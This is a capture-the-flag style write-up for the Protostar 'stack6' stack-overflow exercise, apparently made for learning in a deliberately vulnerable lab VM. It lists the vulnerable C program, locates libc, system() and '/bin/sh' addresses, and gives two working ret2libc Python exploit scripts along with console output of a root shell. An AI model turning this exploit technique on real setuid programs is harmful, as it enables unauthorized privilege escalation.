# Stack 6

Stack6 looks at what happens when you have restrictions on the return address.

This level can be done in a couple of ways, such as finding the duplicate of the payload (`objdump -s` will help with this), or **ret2libc** , or even **return orientated programming**.

It is strongly suggested you experiment with multiple ways of getting your code to execute here.

This level is at `/opt/protostar/bin/stack6`

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void getpath()
{
  char buffer[64];
  unsigned int ret;

  printf("input path please: "); fflush(stdout);

  gets(buffer);

  ret = __builtin_return_address(0);

  if((ret & 0xbf000000) == 0xbf000000) {
    printf("bzzzt (%p)\n", ret);
    _exit(1);
  }

  printf("got path %s\n", buffer);
}

int main(int argc, char **argv)
{
  getpath();
}
```

## Solutions

### ret2libc

1. Get **libc** address (`0xb7e99000`) using `ldd`:

```console
user@protostar:/opt/protostar/bin$ ldd stack6
	linux-gate.so.1 =>  (0xb7fe4000)
	libc.so.6 => /lib/libc.so.6 (0xb7e99000)
	/lib/ld-linux.so.2 (0xb7fe5000)
```

This way of getting the `libc` address worked in other challenges but I don't know why this time it's not the good address.
We can get **libc** address with `gdb`:

```console
user@protostar:/opt/protostar/bin$ gdb -q ./stack6
Reading symbols from /opt/protostar/bin/stack6...done.
(gdb) r
Starting program: /opt/protostar/bin/stack6 
input path please: ^C
Program received signal SIGINT, Interrupt.
0xb7f53c1e in __read_nocancel () at ../sysdeps/unix/syscall-template.S:82
82	../sysdeps/unix/syscall-template.S: No such file or directory.
	in ../sysdeps/unix/syscall-template.S
Current language:  auto
The current source language is "auto; currently asm".
(gdb) info proc mapping
process 2722
cmdline = '/opt/protostar/bin/stack6'
cwd = '/opt/protostar/bin'
exe = '/opt/protostar/bin/stack6'
Mapped address spaces:

	Start Addr   End Addr       Size     Offset objfile
	 0x8048000  0x8049000     0x1000          0        /opt/protostar/bin/stack6
	 0x8049000  0x804a000     0x1000          0        /opt/protostar/bin/stack6
	0xb7e96000 0xb7e97000     0x1000          0        
	0xb7e97000 0xb7fd5000   0x13e000          0         /lib/libc-2.11.2.so
	0xb7fd5000 0xb7fd6000     0x1000   0x13e000         /lib/libc-2.11.2.so
	0xb7fd6000 0xb7fd8000     0x2000   0x13e000         /lib/libc-2.11.2.so
	0xb7fd8000 0xb7fd9000     0x1000   0x140000         /lib/libc-2.11.2.so
	0xb7fd9000 0xb7fdc000     0x3000          0        
	0xb7fde000 0xb7fe2000     0x4000          0        
	0xb7fe2000 0xb7fe3000     0x1000          0           [vdso]
	0xb7fe3000 0xb7ffe000    0x1b000          0         /lib/ld-2.11.2.so
	0xb7ffe000 0xb7fff000     0x1000    0x1a000         /lib/ld-2.11.2.so
	0xb7fff000 0xb8000000     0x1000    0x1b000         /lib/ld-2.11.2.so
	0xbffeb000 0xc0000000    0x15000          0           [stack]
```

The address we were looking for is `0xb7e97000`.

2. Locate the addresses of `system()` (`0x00038fb0`) and `exit()` (`0x0002f0c0`):

```console
user@protostar:/opt/protostar/bin$ readelf -s /lib/libc.so.6 | grep -i system
   238: 000f29d0    66 FUNC    GLOBAL DEFAULT   12 svcerr_systemerr@@GLIBC_2.0
   606: 00038fb0   125 FUNC    GLOBAL DEFAULT   12 __libc_system@@GLIBC_PRIVATE
  1399: 00038fb0   125 FUNC    WEAK   DEFAULT   12 system@@GLIBC_2.0

user@protostar:/opt/protostar/bin$ readelf -s /lib/libc.so.6 | grep -i exit
   107: 0002f520    60 FUNC    GLOBAL DEFAULT   12 __cxa_at_quick_exit@@GLIBC_2.10
   136: 0002f0c0    47 FUNC    GLOBAL DEFAULT   12 exit@@GLIBC_2.0
   542: 00097154    19 FUNC    GLOBAL DEFAULT   12 _exit@@GLIBC_2.0
   596: 000f3880    67 FUNC    GLOBAL DEFAULT   12 svc_exit@@GLIBC_2.0
   630: 0002f4f0    47 FUNC    GLOBAL DEFAULT   12 quick_exit@@GLIBC_2.10
   845: 0002f330    59 FUNC    GLOBAL DEFAULT   12 __cxa_atexit@@GLIBC_2.1.3
  1012: 001053b0    59 FUNC    GLOBAL DEFAULT   12 atexit@GLIBC_2.0
  1339: 00141164     4 OBJECT  GLOBAL DEFAULT   33 argp_err_exit_status@@GLIBC_2.1
  1448: 000d89e0    70 FUNC    GLOBAL DEFAULT   12 pthread_exit@@GLIBC_2.0
  1775: 00097154    19 FUNC    WEAK   DEFAULT   12 _Exit@@GLIBC_2.1.1
  2025: 001410cc     4 OBJECT  GLOBAL DEFAULT   33 obstack_exit_failure@@GLIBC_2.0
  2174: 0002f0f0    88 FUNC    WEAK   DEFAULT   12 on_exit@@GLIBC_2.0
  2318: 000de1c0     5 FUNC    GLOBAL DEFAULT   12 __cyg_profile_func_exit@@GLIBC_2.2
```

3. Then get the address of the sing `"/bin/sh"` (`0x11f3bf`):

```console
user@protostar:/opt/protostar/bin$ strings -atx /lib/libc.so.6 | grep -i "/bin/sh"
 11f3bf /bin/sh
```

4. Write the exploit:

```python
#!/usr/bin/python
import struct

# 1. Create buffer
offset = 80
buffer = 'A' * offset
# 2. Little endian conversion
libc = 0xb7e97000
system = struct.pack('<I', libc + 0x00038fb0)
fn_exit = struct.pack('<I', libc + 0x0002f0c0)
binsh = struct.pack('<I', libc + 0x11f3bf)

payload = buffer + system + fn_exit + binsh

print(payload)
```

Another exploit could be:

```python
import struct

# 1. Create buffer
offset = 80
buffer = 'A' * offset
# 2. Little endian conversion
libc = 0xb7e97000
system = struct.pack('I', 0xb7ecffb0) # (gdb) x/s 0xb7e97000+ 0x00038fb0
return_after_system = 'A' * 4
bin_sh = struct.pack('I', libc + 0x11f3bf)
payload = buffer + system + return_after_system + bin_sh

print(payload)
```

Why do we use `struct.pack('<I', ...)` in the first exploit and `struct.pack('I', ...)` in the second one? I don't know yet but I'll figure it out.

5. Exploit `stack6`:

```console
user@protostar:/opt/protostar/bin$ (python /tmp/exploit-6.py; cat) | ./stack6
input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA���AAAAAAAAAAAA���AAAA�c��
id
uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
^C
Segmentation fault
user@protostar:/opt/protostar/bin$ (python /tmp/exploit-6-v2.py; cat) | ./stack6
input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA���AAAAAAAAAAAA����`췿c��
id
uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
^C
```

### ROP

> TODO

### Find duplicate of the payload with `objdump -s`

> TODO

